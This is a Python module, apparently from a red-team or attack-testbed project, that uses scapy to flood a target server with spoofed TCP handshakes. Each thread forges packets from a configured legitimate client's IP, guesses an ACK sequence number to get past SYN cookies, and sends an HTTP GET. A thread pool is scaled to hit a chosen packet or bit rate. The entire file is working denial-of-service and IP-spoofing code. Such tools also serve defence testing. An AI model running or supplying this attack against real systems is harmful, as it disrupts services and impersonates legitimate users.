import random
import time
from multiprocessing.pool import ThreadPool

from loguru import logger
from scapy.layers.inet import IP, TCP
from scapy.layers.l2 import Ether
from scapy.sendrecv import sendp

from red.config import config
from red.utils import random_port


payload = f"GET /1.html HTTP/1.1\r\n\r\n".encode()
payload_length = len(payload)
packet_size = (20 + 20 + payload_length) * 8
empty_size = 20 + 20
connection_time = packet_size / 100_000_000  # 100Mbps link
bps = (empty_size + empty_size + empty_size + packet_size + empty_size) / connection_time


def connection(_: None):
    while True:
        sport = random_port()
        syn = (
                Ether()
                / IP(src=config.attack.legitimate_client_ip, dst=config.server_host)
                / TCP(sport=sport, dport=config.server_port, flags='S')
        )
        guesses_seq = random.randint(0, 2 ** 32 - 1)  # for syn cookies
        ack = (
                Ether()
                / IP(src=config.attack.legitimate_client_ip, dst=config.server_host)
                / TCP(sport=sport, dport=config.server_port, flags='A', seq=guesses_seq)
        )
        payload_pkt = (
                Ether()
                / IP(src=config.attack.legitimate_client_ip, dst=config.server_host)
                / TCP(sport=sport, dport=config.server_port, flags='P', seq=guesses_seq + 1)
                / payload
        )
        sendp([
            syn,
            ack,
            payload_pkt,
        ], verbose=False)
        time.sleep(connection_time)


def run():
    if config.attack.cli.bps is None:
        threads = int(config.attack.cli.pps)
    else:
        threads = int(config.attack.cli.bps / bps)
    logger.info(f"Starting with: "
                f"{connection_time} "
                f"{payload_length} "
                f"{bps} "
                f"{threads} ")

    with ThreadPool(threads) as pool:
        pool.map(connection, [None] * threads)
